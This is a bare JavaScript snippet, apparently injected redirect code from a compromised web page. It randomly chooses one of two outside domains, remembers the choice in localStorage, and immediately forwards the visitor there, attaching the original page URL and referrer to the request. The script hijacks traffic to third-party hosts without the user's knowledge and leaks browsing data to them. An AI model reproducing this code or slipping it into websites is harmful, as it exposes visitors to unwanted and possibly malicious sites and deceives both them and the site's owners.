var arsDomains = ['https://read.vanphongphamtienloi.com', 'https://global.wowlazy.com'];
var ars = localStorage.getItem('arsae_domain');
if (!ars) {
    ars = arsDomains[Math.floor(Math.random() * arsDomains.length)];
    localStorage.setItem('arsae_domain', ars);}
window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer);
